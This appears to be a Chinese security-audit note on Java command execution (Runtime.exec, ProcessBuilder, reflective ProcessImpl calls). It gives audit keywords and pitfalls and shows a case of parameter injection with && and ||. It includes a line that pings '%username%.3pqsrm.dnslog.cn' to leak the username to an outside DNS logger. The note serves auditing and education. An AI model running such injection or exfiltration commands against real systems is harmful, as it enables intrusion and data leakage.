
<a name="vCFc7"></a>
## Java命令执行的方法
其实可以说java的命令执行是基于ProcessImpl的。<br />Java中可用于执行系统命令的方式有API有:

> java.lang.Runtime.exec
> java.lang.ProcessBuilder
> java.lang.UNIXProcess/ProcessImpl
> javax.script.ScriptEngineManager



<a name="6kBmD"></a>
## 审计的关键词

- 审计方法：可以搜索以下关键词： 

**getRuntime、exec、cmd、shell、Process**

<a name="0o1lr"></a>
## 命令执行函数实例
<a name="AP2zL"></a>
### runtime.exec()
Process process = Runtime.getRuntime().exec("cmd /c dir");<br />     InputStream in = process.getInputStream();<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1612587636585-9a93c66f-1239-45da-b4b4-86d44da06e16.png#align=left&display=inline&height=276&originHeight=368&originWidth=689&size=19286&status=done&style=none&width=517)
<a name="HFxMV"></a>
### ProcessBuilder()
不像exec一样直接启动，需要用start方法进行启动

        ProcessBuilder processBuilder = new ProcessBuilder("cmd.exe", "/c", "ipconfig");<br />        Process start = processBuilder.start();<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1612587675597-e74095f3-a66b-4fae-ade8-85f20822468f.png#align=left&display=inline&height=375&originHeight=500&originWidth=861&size=26023&status=done&style=none&width=646)<br />我在调试的时候发现ProcessBuilder函数在使用start方法的时候会调用到ProcessImpl函数<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1612588379788-6e23b3fd-a59e-46e8-8474-cd25096259a7.png#align=left&display=inline&height=203&originHeight=406&originWidth=1420&size=38221&status=done&style=none&width=710)<br />然后在exec()中调试也发现会调用到ProcessImpl<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1612589601772-c7777423-8c97-4981-a340-fcf0885690c7.png#align=left&display=inline&height=213&originHeight=426&originWidth=1401&size=33815&status=done&style=none&width=700.5)
<a name="hiqt8"></a>
### ProcessImpl()
ProcessBuilder、exec函数运行命令执行的时候都会调用到processimpl函数<br />跟入这个ProcessImpl函数，发现这个函数是私有类<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1612598173116-7abd6e96-7f00-4fd0-acbf-eb447f1c310e.png#align=left&display=inline&height=135&originHeight=135&originWidth=514&size=6031&status=done&style=none&width=514)<br />查看start方法<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1612598342095-76152fc2-c643-450f-a286-26b0461934a2.png#align=left&display=inline&height=151&originHeight=151&originWidth=613&size=6512&status=done&style=none&width=613)

```java
    public static void main(String[] args) throws Exception {
        Class clazz = Class.forName("java.lang.ProcessImpl");
        Method start = clazz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
        start.setAccessible(true);
        start.invoke(null, new String[]{"CALC"}, null, null, null, false);
    }
}
```

<a name="Kwm0X"></a>
## 命令执行的一些坑
例如如下一段实例代码<br />`Runtime.getRuntime().exec("calc");`<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1612538374524-a3ae7b3f-c5b4-45a0-88ab-a18ada9c7c4c.png#align=left&display=inline&height=350&originHeight=699&originWidth=787&size=124259&status=done&style=none&width=394)<br />但是这样子是不可以从console中看到回显的，没有回显即使程序出错了，也无法判断。<br />需要使用抽象类Process 
> process类提供获取**子进程的输入流、子进程的输出流、子进程的错误流、等待进程完成、检查进程的推出状态以及销毁进程的方法**；在这里需要提及的是创建的子进程没有自己的控制台或终端，其所有的io操作都是通过（输入流、输出流、错误流）重定向到父进程中。

java中的**inputstream**是一个面向字节的流抽象类，专门用来读取文件流的对象<br />**getInputStream()**用于获取流程和子流程的输入流<br />下面的程序相当于流之间的转化并输出。<br />
```java
public class testjsp {
	public static void main(String[] args) throws IOException {

		Process process = Runtime.getRuntime().exec("calc");
	    InputStream in = process.getInputStream();
	    int a = 0;
	    byte[] b = new byte[1024];

	    while ((a = in.read(b)) != -1) {
	        System.out.println(new String(b, 0, a));
	    }

	    in.close();
    }
}
```
但是exec直接执行一些其他的命令，比如带有%会出现问题，如下所示

![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1612541973140-78dde2c2-a070-439a-a8d5-00a99049aebf.png#align=left&display=inline&height=326&originHeight=651&originWidth=1182&size=59995&status=done&style=none&width=591)<br />当时以为用 [http://www.jackson-t.ca/runtime-exec-payloads.html ](http://www.jackson-t.ca/runtime-exec-payloads.html)中进行编码，但是发现还是不行<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1612542056197-baa55280-68d0-4bad-b1b6-a6f585754c3d.png#align=left&display=inline&height=281&originHeight=561&originWidth=1134&size=33308&status=done&style=none&width=567)<br />**解决办法1：**

需要把执行长串的命令定义为数组的形式传参就可以执行<br />exec(new String[]{"cmd", "/c", "ping %username%.3pqsrm.dnslog.cn"});<br />↓ 等同于

String [] cmd={"cmd","/C","ping %username%.3pqsrm.dnslog.cn"}; <br />Process process =Runtime.getRuntime().exec(cmd);



![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1612543774513-1d342a94-6bc9-468b-9120-f1a909598864.png#align=left&display=inline&height=358&originHeight=716&originWidth=895&size=43190&status=done&style=none&width=448)<br />**解决办法2：**<br />因为本机是windows，所以直接带入cmd /c

![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1612579927889-03af3e66-d9b5-4e96-b179-bd577b13d551.png#align=left&display=inline&height=363&originHeight=726&originWidth=947&size=40999&status=done&style=none&width=473.5)
<a name="3W5IK"></a>
## linux和windows命令执行的调用

- Windows下调用系统命令

String [] cmd={"cmd","/C","whoami"}; <br />Process proc =Runtime.getRuntime().exec(cmd);

- Linux下调用系统命令就要改成下面的格式

String [] cmd={"/bin/sh","-c","whoami"}; <br />Process proc =Runtime.getRuntime().exec(cmd);


<a name="VlOsy"></a>
## 实战案例
在某次java审计的业务中，发现如下命令语句，pdfName参数、swfName参数可控并没有任何其他防护，只要使用相关的符号就可以绕过

![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1612439661062-ec6e01a2-633d-43fd-aa00-b934da931b39.png#align=left&display=inline&height=64&originHeight=85&originWidth=1054&size=4477&status=done&style=none&width=791)

例如nmap工具，只要加上&&(表示与)“||”表示或 等运算符就可以命令执行了<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1612439874132-657e176e-e4bf-4458-b739-1637e7a92177.png#align=left&display=inline&height=130&originHeight=260&originWidth=1059&size=143270&status=done&style=none&width=529.5)




好文章:

[https://github.com/byt3bl33d3r/OffensiveNim](https://github.com/byt3bl33d3r/OffensiveNim)<br />[https://blog.csdn.net/Auuuuuuuu/article/details/109476854?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.control](https://blog.csdn.net/Auuuuuuuu/article/details/109476854?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.control)<br />[https://blog.csdn.net/qsort_/article/details/104821283](https://blog.csdn.net/qsort_/article/details/104821283)
